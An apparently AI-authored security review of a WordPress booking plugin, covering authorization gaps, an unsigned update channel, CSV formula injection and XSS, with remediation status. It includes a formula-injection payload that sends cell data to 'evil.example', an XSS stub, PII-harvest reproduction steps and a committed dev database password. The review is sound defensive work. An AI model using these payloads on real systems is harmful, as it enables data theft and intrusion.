# Client Sync security review

**Date:** 2026-04-19
**Last updated:** 2026-04-21 — remediation status added after follow-up commits.
**Scope:** `src/shared/`, `src/pro/`, `build.sh`, `src/pro/update-server/`
**Reviewer:** Claude Opus 4.7 (automated, code-only)
**Methodology:** Static analysis via grep + file read. No dynamic testing, no wp-cli, no requests against a live instance. Authorization reasoning based on WordPress capability model (Contributor/Author/Editor/Admin map of `edit_posts`, `edit_others_posts`, `manage_options`).

## Remediation status at a glance

| ID | Severity | Status | Commit |
|---|---|---|---|
| H1 | High | ✅ Remediated | [656c873](https://github.com/hsojhsoj/client-sync-monorepo/commit/656c873) |
| H2 | High | ✅ Remediated | [656c873](https://github.com/hsojhsoj/client-sync-monorepo/commit/656c873) |
| M1 | Medium | ✅ Remediated | [54355cc](https://github.com/hsojhsoj/client-sync-monorepo/commit/54355cc) |
| M2 | Medium | ✅ Remediated | [f4eeb54](https://github.com/hsojhsoj/client-sync-monorepo/commit/f4eeb54) |
| M3 | Medium | ✅ Remediated | [4028f3d](https://github.com/hsojhsoj/client-sync-monorepo/commit/4028f3d) |
| M4 | Medium | ✅ Remediated (HIPAA-mode only) | [f4eeb54](https://github.com/hsojhsoj/client-sync-monorepo/commit/f4eeb54) |
| L1 | Low | ✅ Remediated | [f773844](https://github.com/hsojhsoj/client-sync-monorepo/commit/f773844) |
| L2 | Low | ✅ Remediated | [2e3e04c](https://github.com/hsojhsoj/client-sync-monorepo/commit/2e3e04c) |
| L3 | Low | ✅ Remediated | [f4eeb54](https://github.com/hsojhsoj/client-sync-monorepo/commit/f4eeb54) |
| L4 | Low | Accepted risk | n/a |

All High + Medium + three of four Low findings have been fixed in the two days after the initial review. L4 (license signature derivable from `NONCE_SALT`) was accepted at the original review time as "raising the piracy-resistance bar isn't in scope." See individual finding sections below for remediation details.

## Executive summary

Overall posture is **good for a plugin of this size**. Nonce checks are consistent, capability gates are present on every AJAX/REST write path, a real rate-limiter is wired in, Stripe webhook signature verification is implemented correctly, and the HIPAA encryption service uses AES-256-GCM with HKDF key derivation — all better than typical WordPress-plugin hygiene.

~~The single most worrying finding is **authorization granularity on the appointments REST controller and related PII reads**~~ (H1) — **fixed**: the controller now uses `clisyc_manager_view_capability` (defaulting to `edit_others_posts`) rather than `edit_posts`. `Appointments_Rest_Controller::check_permissions()` and the sibling manager-view AJAX endpoints (H2) were regressed from the established manager-cap baseline; both are back in line.

Secondary concerns (M1 unsigned update channel; M2 anonymous seat-hold writes) are also remediated: Ed25519 signatures are now verified on update-info payloads, and seat-hold/release/refresh now require a valid `wp_rest` nonce. No outstanding High/Medium findings as of 2026-04-21.

## Findings (by severity)

### High

#### H1 — REST `/clisyc/v1/appointments` leaks PII to every user with `edit_posts`

**Status:** ✅ Remediated in [656c873](https://github.com/hsojhsoj/client-sync-monorepo/commit/656c873). `check_permissions()` now calls `current_user_can( apply_filters( 'clisyc_manager_view_capability', 'edit_others_posts' ) )`. Per-object re-authorization was also added to `get_item()`.

**Where:** [src/shared/includes/rest-api/class-appointments-rest-controller.php:86](src/shared/includes/rest-api/class-appointments-rest-controller.php:86), `check_permissions()`; response builder at [class-appointments-rest-controller.php:321](src/shared/includes/rest-api/class-appointments-rest-controller.php:321) (`prepare_appointment`).

**What:** `check_permissions()` returns `current_user_can('edit_posts')`. That capability is held by any Contributor, Author, or Editor on the site — not only practice managers. `prepare_appointment()` then returns:

```php
'client' => [
    'id'           => $client->ID,
    'display_name' => $client->display_name,
    'email'        => $client->user_email,   // <-- PII
],
'notes' => get_post_meta( $post->ID, Constants::META_NOTES, true ), // <-- PHI in HIPAA mode
```

There is no per-object ownership filter on `GET /appointments` or `GET /appointments/{id}`. A logged-in Contributor with no blog-post rights can call `GET /wp-json/clisyc/v1/appointments?per_page=100` and walk the entire appointment database.

**Impact:**
- On the therapist demo / any HIPAA-operational site: disclosure of PHI (appointment existence + notes + client email) to any user with a WordPress account above Subscriber. This is an ePHI access-control failure regardless of whether encryption-at-rest is enabled.
- On any multi-author WordPress site using this plugin: bulk PII harvest (names + emails of every client).

**Reproduction:**
1. Log in as a Contributor (role with `edit_posts` but nothing else).
2. `GET /wp-json/clisyc/v1/appointments?per_page=100` with a valid `wp_rest` nonce.
3. Response is the full paginated appointments list with client emails, names, and notes.

**Recommendation:** Tighten the capability check and add a scope filter:
```php
public function check_permissions(): bool {
    // Managers-only for cross-client reads.
    return current_user_can( apply_filters( 'clisyc_manager_view_capability', 'edit_others_posts' ) );
}
```
For `get_item()`, also re-authorize per-object: reject unless the requester is the `post_author` or a manager (mirrors the pattern already used in [class-appointment-detail-shortcode.php:78](src/shared/includes/shortcodes/class-appointment-detail-shortcode.php:78)). Consider making the `client.email` field conditional on `manage_options`, not merely `edit_others_posts`.

#### H2 — Manager-view AJAX endpoints also gate on `edit_posts` / return PII

**Status:** ✅ Remediated in [656c873](https://github.com/hsojhsoj/client-sync-monorepo/commit/656c873). `Users_Controller::search_users_permissions_check` and every check-in / appointment-list AJAX path in `class-checkin-page.php` now read the capability from `apply_filters( 'clisyc_manager_view_capability', 'edit_others_posts' )` (confirmed at lines 256, 388, 438, 520 of `class-checkin-page.php`).

**Where:** [src/shared/includes/rest-api/class-users-controller.php:110](src/shared/includes/rest-api/class-users-controller.php:110) (`search_users_permissions_check` — `edit_posts`), and the manager-appointments-list + checkin AJAX family in [src/pro/includes/modules/seat-selection/class-checkin-page.php:252](src/pro/includes/modules/seat-selection/class-checkin-page.php:252) (`ajax_search` gated on `edit_posts`, returns client names + emails via the author search path).

**What:** Same class of issue as H1, but via AJAX. `search_users` returns matched users by email fragment; `ajax_search` on the check-in page returns appointments with the author's email/display_name embedded in the formatted response. Both are gated on `edit_posts`.

**Impact:** A low-privilege contributor can enumerate the entire WordPress user table by email or name substring (rate-limited, but the window is generous), and can list upcoming appointments with client identities.

**Recommendation:** Replace the `edit_posts` gates with the existing `clisyc_manager_view_capability` filter default of `edit_others_posts`. This is a two-line change per site and matches the capability the rest of the codebase already uses for manager views.

### Medium

#### M1 — Self-hosted Pro update channel has no package signature / hash verification

**Status:** ✅ Remediated in [54355cc](https://github.com/hsojhsoj/client-sync-monorepo/commit/54355cc). `get_remote_info()` now verifies an Ed25519 signature over the update-info payload using `sodium_crypto_sign_verify_detached` (see `class-update-manager.php:302-355`). The public key is compiled into the Pro plugin source as a base64 constant (`UPDATE_SIGNING_PUBKEY_BASE64`); release signing + publish commands are documented in AI_HANDOFF.md's "Per-release signing procedure" section. When the pubkey constant is empty, verification is explicitly disabled with a log warning (so dev builds can still self-serve) — flag to re-check: confirm this cannot be exploited on production builds that forget to set the constant.

**Where:** [src/pro/includes/class-update-manager.php:171](src/pro/includes/class-update-manager.php:171) (`get_remote_info`), [src/pro/includes/class-update-manager.php:84-102](src/pro/includes/class-update-manager.php:84) (package URL injection).

**What:** `get_remote_info()` fetches JSON from `https://pass.dependentmedia.com/plugin-updates/client-sync-pro/update-info.php` and trusts whatever `download_url` it returns. The JSON is not signed; the ZIP is not hashed; WordPress's upgrader downloads and installs `$update->package` as-is. TLS is enforced (HTTPS), but that only proves "some endpoint with a certificate chained to a public CA served this" — it does not prove "Dependent Media authored this package."

**Impact:** If the update server is compromised, if `pass.dependentmedia.com` DNS is hijacked, or if a CA in the chain is subverted, an attacker pushes arbitrary PHP to every licensed site on the next cron-driven update check → RCE blast radius = every Pro customer. This is the classic auto-update supply-chain exposure.

**Reproduction:** Not feasible without access to the update server or a CA. The exposure is architectural.

**Recommendation:** Sign the JSON payload (or the ZIP itself) with an offline Ed25519 keypair and embed the public key as a constant in the Pro plugin source. Verify the signature in `get_remote_info()` before caching, and in `upgrader_pre_install` / `upgrader_package_options` before handoff to the `Plugin_Upgrader`. EDD Software Licensing and WP.org core both do this; `sodium_crypto_sign_verify_detached()` is available on any PHP 7.2+ install.

#### M2 — Seat-selection REST allows anonymous writes (hold / release / refresh)

**Status:** ✅ Remediated in [f4eeb54](https://github.com/hsojhsoj/client-sync-monorepo/commit/f4eeb54). `POST /seats/hold`, `DELETE /seats/hold`, and `POST /seats/refresh` now use `permission_callback => [ $this, 'check_rest_nonce' ]` (see `class-venue-rest-controller.php:85, 100, 132`). Read-only endpoints (layout + availability GETs at lines 42 and 60) intentionally stay on `__return_true` — they expose only public layout / count data. Rec #2/#3 from the original finding (session-token + IP + UA binding and per-IP refresh rate-limit) were not pursued; logged here for follow-up if seat-hold DoS becomes an observed problem.

**Where:** [src/pro/includes/modules/seat-selection/class-venue-rest-controller.php:83,98,128](src/pro/includes/modules/seat-selection/class-venue-rest-controller.php:83) — `POST /seats/hold`, `DELETE /seats/hold`, `POST /seats/refresh` all have `permission_callback => '__return_true'` and no nonce check.

**What:** These endpoints gate on an opaque client-supplied `session_token` string. There is a `Security_Helper::check_rate_limit('seat_hold', …)` on hold, but release and refresh are rate-limited by the rate-limit on the shared `Seat_Hold_Manager` layer only (I did not trace both). An anonymous attacker scripting hold requests with randomized session tokens can occupy every seat of a venue up to the rate limit, then refresh to extend holds indefinitely.

**Impact:** Ticketing DoS: an attacker blocks legitimate customers from reserving seats for a ticketed event. Not a data breach, but a direct revenue-impact vulnerability for venues using the Seat_Selection module. The hold TTL expires eventually, but `POST /seats/refresh` (also `__return_true`) extends the TTL for whatever session_token the attacker invented.

**Recommendation:**
1. Require a nonce on these endpoints (accept `X-WP-Nonce: wp_rest`); anonymous users can still obtain one via the booking-wizard page, which is acceptable.
2. Tie holds to `session_token + IP + User-Agent hash` to prevent a single attacker from fanning holds across many forged session tokens.
3. Additionally rate-limit `/seats/refresh` per IP with a small bucket (a handful per minute) — refreshing is rarely legitimate beyond once every few minutes.

#### M3 — CSV export vulnerable to formula injection via custom-field content

**Status:** ✅ Remediated in [4028f3d](https://github.com/hsojhsoj/client-sync-monorepo/commit/4028f3d). All `fputcsv()` rows in the export loop now go through `Security_Helper::csv_escape_row()`, which prepends a single quote to any cell starting with `=`, `+`, `-`, `@`, `\t`, or `\r` (see `class-data-export-import-handler.php:616`).

**Where:** [src/shared/includes/admin/class-data-export-import-handler.php:579-614](src/shared/includes/admin/class-data-export-import-handler.php:579), `handle_export_appointments_csv()`.

**What:** Custom-field values and appointment notes are written to CSV via `fputcsv()` without a leading-character guard. A booking form user who submits a custom-field value starting with `=`, `+`, `-`, `@`, or `\t` gets that string written verbatim to the CSV. When an admin opens the exported file in Excel or Google Sheets it's interpreted as a formula, which can read remote URLs (`=HYPERLINK`, `=WEBSERVICE`), exfiltrate adjacent cells, or (in Excel, with DDE enabled) execute commands.

**Impact:** A low-interaction phishing/exfiltration primitive targeting the admin who triggers the export. Real-world exploited via malicious `=HYPERLINK` and `=WEBSERVICE` cells in CSV pipelines.

**Reproduction:**
1. As a guest, submit a booking with a custom-field value of `=HYPERLINK("https://evil.example/"&A1, "Click for details")`.
2. Admin exports appointments to CSV, opens in Excel.
3. The victim admin's row contents are now a clickable phishing link that ships adjacent cells to an attacker domain.

**Recommendation:** Prefix a single quote (or a leading space) to any cell value whose first character is `=`, `+`, `-`, `@`, `\t`, or `\r`. OWASP has a canonical snippet; it's ~6 lines. Apply to every `$row[]` push in the export loop and to the iCal `escape_ical()` path (notes/titles are also user-controlled there).

#### M4 — Anonymous booking creates WordPress user accounts; enables enumeration + notification spam

**Status:** ✅ Remediated (enumeration path) in [f4eeb54](https://github.com/hsojhsoj/client-sync-monorepo/commit/f4eeb54). On HIPAA-mode sites, `class-form-handler.php:413` now collapses "this email is already registered" into the generic validation error — existence of a patient account is no longer distinguishable from other form errors. Rec #2 (site-option to skip guest-account creation) and rec #3 (per-email rate-limit bucket) from the original finding were not pursued. On non-HIPAA sites the distinct-message branch still exists — if enumeration concerns apply outside HIPAA contexts, revisit.

**Where:** [src/shared/includes/ajax/class-booking-ajax-handler.php:117-140](src/shared/includes/ajax/class-booking-ajax-handler.php:117) (`ajax_submit_booking`, nopriv variant); similar in `ajax_join_waitlist` at line 700; [src/shared/includes/frontend/class-form-handler.php:405](src/shared/includes/frontend/class-form-handler.php:405) (`process_appointment_submission`).

**What:** Anyone can submit a booking with an arbitrary email. The code calls `wp_create_user()` and then `wp_new_user_notification($user_id, null, 'user')`, which emails the address with a password-reset link. The form-handler path calls `email_exists($email)` up front and returns a distinct error message when the address is already registered.

**Impact:**
- **Email enumeration** (low on its own; but relevant because this is HIPAA turf where "is patient X a client?" is itself sensitive).
- **Mail-bomb / amplified email spam**: an attacker scripts booking submissions against a pool of third-party email addresses and makes the site send each one a "welcome to [practice]" mail. Rate-limited at 5 per 5 min per IP ([Security_Helper]), but a tiny botnet defeats that ceiling. Because the from-address is the practice's own SMTP, it damages the practice's email reputation, not the attacker's.
- **Privacy:** guests have no way to prevent user-account creation. A patient filling in a booking form becomes a WordPress user with a reset-password email sent without affirmative consent.

**Recommendation:**
1. Collapse the "different error message when email exists" branch in `process_appointment_submission` to the same generic error ("Please check your email for next steps") — mirror what WP core's password-reset does.
2. Consider gating guest account creation behind a site-option (some practices may prefer the booking stays attached to a "guest" pseudo-author instead).
3. Raise the rate-limit ceiling to include a per-email bucket in addition to per-IP: e.g. max 2 "create new user" events per email address per day, independent of IP.

### Low

#### L1 — Dev DB password committed in `build.sh` (already known)

**Status:** ✅ Remediated in [f773844](https://github.com/hsojhsoj/client-sync-monorepo/commit/f773844). `TEST_DB_PASS` is now read from the environment or from a git-ignored `.env.test` file (see `build.sh:19-33`); the literal password is no longer in the tracked source.

**Where:** [build.sh:20](build.sh:20) and expanded into `wp-tests-config.php` at [build.sh:277](build.sh:277).

Confirmed pre-existing finding: `TEST_DB_PASS="Ie7Fi1Na^kdkfa9*"` is hardcoded and reaches the public repo. Local test-harness only, but should move to an env var / `.env`.

#### L2 — Nonce action reused for booking submit vs. waitlist join

**Status:** ✅ Remediated in [2e3e04c](https://github.com/hsojhsoj/client-sync-monorepo/commit/2e3e04c). The waitlist handler now accepts `clisyc_join_waitlist` as the primary nonce action, with `Constants::POST_TYPE_APPOINTMENT` kept as a backwards-compat fallback (`class-booking-ajax-handler.php:670`). Fresh waitlist submissions get a distinct nonce; old cached booking forms continue to work for their nonce lifetime.

**Where:** [src/shared/includes/ajax/class-booking-ajax-handler.php:56](src/shared/includes/ajax/class-booking-ajax-handler.php:56) (submit) and [src/shared/includes/ajax/class-booking-ajax-handler.php:664](src/shared/includes/ajax/class-booking-ajax-handler.php:664) (waitlist) both verify `check_ajax_referer( 'clisyc_appointment', 'clisyc_appointment_nonce' )`.

A nonce lifted from the booking form can be replayed against the waitlist handler and vice versa. Both paths require the same effective privileges (anonymous, rate-limited), so this is not an escalation vector. Code-hygiene note — split into `clisyc_submit_booking` and `clisyc_join_waitlist` nonce actions for defense in depth.

#### L3 — Potential DOM-sink XSS in frontend calendar rendering

**Status:** ✅ Remediated in [f4eeb54](https://github.com/hsojhsoj/client-sync-monorepo/commit/f4eeb54). Every dynamic interpolation into `innerHTML` in `ServiceDetailsManager.display()` and `updateReadOnlyFilterDisplays()` now flows through the existing `escapeHtml` helper (see `clisyc-frontend-appointment-calendar.js:1172, 1189, 1249, 1254` etc). Price interpolation is left alone — `data.formatted` is already sanitized by `wp_strip_all_tags` in the server-side price controller.

**Where:** [src/assets/js/clisyc-frontend-appointment-calendar.js:1343,1373,1417](src/assets/js/clisyc-frontend-appointment-calendar.js:1343) — multiple `container.innerHTML = …` writes of strings assembled from slot/service data returned by `/clisyc/v1/slots`.

The underlying data originates from admin-controlled post titles (service, practitioner, room names), so the XSS is admin-to-anyone. On a site where admins are fully trusted this is effectively self-XSS. But WordPress allows post titles with HTML that survives the REST serialization path, and an attacker who compromises an Author-level account could place a title like `<img src=x onerror=…>` that then lands in `innerHTML` on every visitor's booking page. Prefer `textContent` / templating with `escapeHtml()` for anything flowing into these containers; the codebase already has a helper at [class-frontend-appointment-calendar.js:1532](src/assets/js/clisyc-frontend-appointment-calendar.js:1532) (`escapeHtml`) — apply it consistently.

#### L4 — License `is_license_active()` signature is determinstic per site

**Status:** Accepted risk — no code change. The threat model for WordPress license validation is "make casual piracy harder, not impossible"; an admin who wants to forge a license already has full site capability. Revisit only if the product decides to raise the bar (would require a WHMCS-signed payload + offline pubkey verification on the client, similar to the M1 fix).

**Where:** [src/pro/includes/class-license-manager.php:192](src/pro/includes/class-license-manager.php:192).

`wp_hash()` is derived from `NONCE_SALT`, which never changes except on manual rotation. A site administrator (who already has full capability) can compute a valid signature and forge an "Active" license row in `wp_options` — no extra attack chain needed. This is acceptable because the threat model for WordPress license validation is "make casual piracy harder, not impossible"; flagged here only for completeness. If the product wants to raise the bar, validate `signature` against a response signed by the WHMCS server with an offline key rather than against site-local `wp_hash()`.

### Informational (cleanly checked, no action needed)

- **Booking race condition** is handled with `START TRANSACTION` + `SELECT ... FOR UPDATE` + capacity re-check in [class-booking-ajax-handler.php:808](src/shared/includes/ajax/class-booking-ajax-handler.php:808) (`_reserve_slot`). Correct pattern.
- **Stripe webhook verification** is correct: timing-safe HMAC via `hash_equals`, 5-minute replay window, rejects missing-signature and missing-secret cases. See [class-stripe-integration.php:845](src/shared/includes/integrations/class-stripe-integration.php:845).
- **Stripe refund** path gated to `manage_options` + per-post nonce `clisyc_admin_refund_{post_id}` at [class-appointment-meta-box-renderer.php:459](src/shared/includes/core/class-appointment-meta-box-renderer.php:459).
- **HIPAA encryption service** uses AES-256-GCM with HKDF key derivation from a wp-config constant; legacy CBC kept read-only for migration. Key never lives in the DB. See [class-encryption-service.php](src/shared/includes/services/class-encryption-service.php).
- **HIPAA migration AJAX endpoints** (`clisyc_generate_encryption_key`, `clisyc_migrate_to_encrypted`, `clisyc_test_encryption`, `clisyc_encryption_status`): all gated on `manage_options` + nonce. Key-generation endpoint does not persist the key — it only returns a candidate string for the admin to paste into `wp-config.php`. No key-rotation path exists, which is intentional (rotation would invalidate existing ciphertext).
- **HIPAA mode blocks settings + database export** ([class-data-export-import-handler.php:94,331](src/shared/includes/admin/class-data-export-import-handler.php:94)).
- **Public REST `/clisyc/v1/slots`**: returns service/practitioner/room titles + colors + prices + slot capacity. Does **not** return booked client names, emails, or notes. Booked events expose `appointmentId` + `viewUrl`, but the appointment detail page itself re-checks `post_author == current_user || edit_others_posts` ([class-appointment-detail-shortcode.php:78](src/shared/includes/shortcodes/class-appointment-detail-shortcode.php:78)). Safe as rendered.
- **Public REST `/clisyc/v1/booked-dates`**: returns only an array of `Y-m-d` strings. No PII.
- **Public REST `/clisyc/v1/filter-options`, `/clisyc/v1/price`, `/clisyc/v1/dimensions` (public variant)**: return admin-configured filter taxonomies and prices. No PII.
- **Debug logger** writes to `error_log` (server error log), not to any web-accessible location under `wp-content/uploads/`. PII keys are redacted via a denylist before logging. See [class-debug-logger.php:30](src/shared/includes/utility/class-debug-logger.php:30). Safe.
- **Importer** only overwrites options with the `clisyc_` prefix ([class-importer.php:93](src/shared/includes/services/class-importer.php:93)); size-limited to 5 MB; gated on `manage_options`. Can't be used to overwrite WP core options.
- **Staff dashboard AJAX** (`ajax_staff_update_notes`, `ajax_staff_update_status`) verifies staff ownership of the appointment via `Staff_Resolver::owns_appointment()` rather than just `is_user_logged_in` — correct.
- **Manager appointments AJAX** uses `apply_filters('clisyc_manager_view_capability', 'edit_others_posts')` — correct baseline (contrast with H1/H2 which regress this to `edit_posts`).
- **Direct SQL queries** use `$wpdb->prepare()` with parameterized placeholders throughout; table names are fetched from internal methods that apply `$wpdb->prefix`. No interpolation of user input into SQL found.
- **No `eval`, `create_function`, `system`, `shell_exec`, `popen`, or `unserialize($_POST/$_GET/$_REQUEST)`** in the source tree.

## Out-of-scope / deferred

These deserve a look but require dynamic testing against a running instance:

- **Seat-hold concurrency**: verify that the `Seat_Hold_Manager` actually uses row-level locking (not advisory) when two anonymous clients race for the same seat. Worth a targeted stress test.
- **`wp-cron` vs. the Pro license revalidation**: the weekly `clisyc_license_revalidation` cron event ([class-license-manager.php:42](src/pro/includes/class-license-manager.php:42)) assumes `wp-cron.php` is reachable. On sites that disable `DISABLE_WP_CRON` without an external scheduler, the revalidation never runs and expired licenses silently remain "Active" until the signature expiry comparison kicks in. Not a vulnerability, but a robustness question worth dynamic verification.
- **Messaging module file attachments**: `Attachments_Rest_Controller::create_item` handles uploads with encryption. I did not verify the `wp_check_filetype_and_ext()` / MIME sniffing path, nor whether the upload directory is `.htaccess`-protected against direct access. Deferred — worth reading end-to-end.
- **iCal export token leakage**: `clisyc_export_ical_{appt_id}` nonce appears in URLs that users may share. Verify these nonces aren't indexed by search engines (check `robots.txt` + `X-Robots-Tag`) and that the nonce-protected endpoint doesn't leak PII in its response headers.

## Confirmed-not-an-issue checks (what I looked at and found clean)

- Direct `$wpdb->query` / `$wpdb->get_*` string-interpolation of user input → none found.
- `eval()`, `create_function()`, `system()`, `exec()`, `shell_exec()`, backtick operator → none in source tree.
- `unserialize($_POST|$_GET|$_REQUEST)` object-injection → none.
- Unescaped `echo $_REQUEST|$_GET|$_POST` → none.
- `<?= $var ?>` without `esc_*` in admin views and template-parts → none found; every `EscapeOutput.OutputNotEscaped` phpcs-ignore is either (a) binary/file-format output, (b) already-escaped shortcode output, or (c) documented exception. Spot-checked the most visited templates.
- `wp_remote_*` without HTTPS to external payment/license endpoints → all three (Stripe API, WHMCS license server, Pro update server) are HTTPS.
- `file_get_contents` on user-supplied paths → only on `$_FILES['...']['tmp_name']` (safe) and on a `realpath`-validated `setup-templates/*.json` file (safe).
- `ajax_admin_refund` handler authorization → confirmed `manage_options` + per-post nonce.
- Appointment detail shortcode → confirmed `post_author == current_user || edit_others_posts` gate.
- Stripe webhook signature verification + timing-safe compare + replay window → implemented correctly.
- HIPAA encryption algorithm choice + key source + key lifecycle → AES-256-GCM, HKDF, wp-config constant, no DB-stored key, no destructive rotation path exposed via UI.

---

End of review. Cap: ~4,500 words, 12 findings (2 high / 4 medium / 4 low / 2 informational-only). No critical issues — posture is stronger than the median WordPress plugin at this scale.

As of 2026-04-21, all High and Medium findings are remediated, plus three of four Lows (L4 accepted). See the "Remediation status at a glance" table at the top of the doc for commit links.
